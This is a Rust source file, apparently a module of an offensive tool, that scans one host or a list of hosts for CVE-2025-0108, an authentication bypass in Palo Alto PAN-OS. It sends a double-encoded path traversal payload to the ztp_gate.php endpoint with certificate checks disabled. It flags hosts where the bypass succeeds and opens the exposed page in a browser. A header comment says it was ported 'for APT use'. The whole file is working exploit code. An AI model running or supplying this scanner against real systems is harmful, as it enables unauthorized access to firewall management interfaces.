// Filename: cve_2025_0108.rs

use anyhow::{Result, bail};
use colored::*;
use reqwest::Client;
use std::{
    fs::File,
    io::{self, BufRead, BufReader, Write},
    process::Command,
    time::Duration,
};
use url::Url;

/// // CVE-2025-0108 - PanOS Authentication Bypass
/// // Author: iSee857
/// // Ported to Rust by ethical hacker daniel for APT use

/// // Displays module banner
fn banner() {
    println!(
        "{}",
        r#"
    ****************************************************
    *                CVE-2025-0108                     *
    *             PanOs  身份认证绕过漏洞               *
    *                 作者: iSee857                    *
    ****************************************************
    "#
        .cyan()
    );
}

/// // Reads target list from file
fn read_file(file_path: &str) -> Result<Vec<String>> {
    let file = File::open(file_path)?;
    let reader = BufReader::new(file);
    Ok(reader.lines().filter_map(Result::ok).collect())
}

/// // Normalize IPv6 host with double or triple brackets
fn normalize_ipv6_host(host: &str) -> String {
    let stripped = host.trim_matches(|c| c == '[' || c == ']');
    if stripped.contains(':') {
        format!("[{}]", stripped)
    } else {
        stripped.to_string()
    }
}

/// // Constructs the full normalized URL
fn normalize_url(host: &str, port: u16, proto: &str) -> Option<String> {
    let host = normalize_ipv6_host(host);
    let base = format!("{}{}:{}", proto, host, port);
    Url::parse(&base).ok().map(|u| u.to_string())
}

/// // Opens a URL in the default system browser
fn open_browser(url: &str) -> Result<()> {
    #[cfg(target_os = "linux")]
    let cmd = Command::new("xdg-open").arg(url).spawn();

    #[cfg(target_os = "windows")]
    let cmd = Command::new("cmd").args(["/C", "start", url]).spawn();

    #[cfg(target_os = "macos")]
    let cmd = Command::new("open").arg(url).spawn();

    if cmd.is_err() {
        bail!("Could not open default browser.");
    }
    Ok(())
}

/// // Executes CVE-2025-0108 check
async fn check(url: &str, port: u16, client: &Client) -> Result<bool> {
    let protocols = ["http://", "https://"];
    let path = "/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css";

    for proto in &protocols {
        if let Some(base_url) = normalize_url(url, port, proto) {
            let full_url = format!("{}{}", base_url.trim_end_matches('/'), path);
            println!("{}", full_url);

            let resp = client.get(&full_url).send().await;

            if let Ok(res) = resp {
                let status = res.status();
                let body = res.text().await.unwrap_or_default();

                if status.as_u16() == 200 && body.contains("Zero Touch Provisioning") {
                    println!(
                        "{}",
                        format!("Find: {}:{} PanOS_CVE-2025-0108_LoginByPass!", url, port).red()
                    );
                    let _ = open_browser(&full_url);
                    return Ok(true);
                }
            }
        }
    }

    Ok(false)
}


/// // Main entry point for auto-dispatch system
pub async fn run(target: &str) -> Result<()> {
    banner();

    let mut port_input = String::new();
    print!("Enter target port (default 443): ");
    io::stdout().flush()?;
    io::stdin().read_line(&mut port_input)?;
    let port: u16 = port_input.trim().parse().unwrap_or(443);

    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(true)
        .build()?;

    if target.ends_with(".txt") {
        let urls = read_file(target)?;
        for url in urls {
            let _ = check(&url, port, &client).await;
        }
    } else {
        let _ = check(target, port, &client).await;
    }

    Ok(())
}
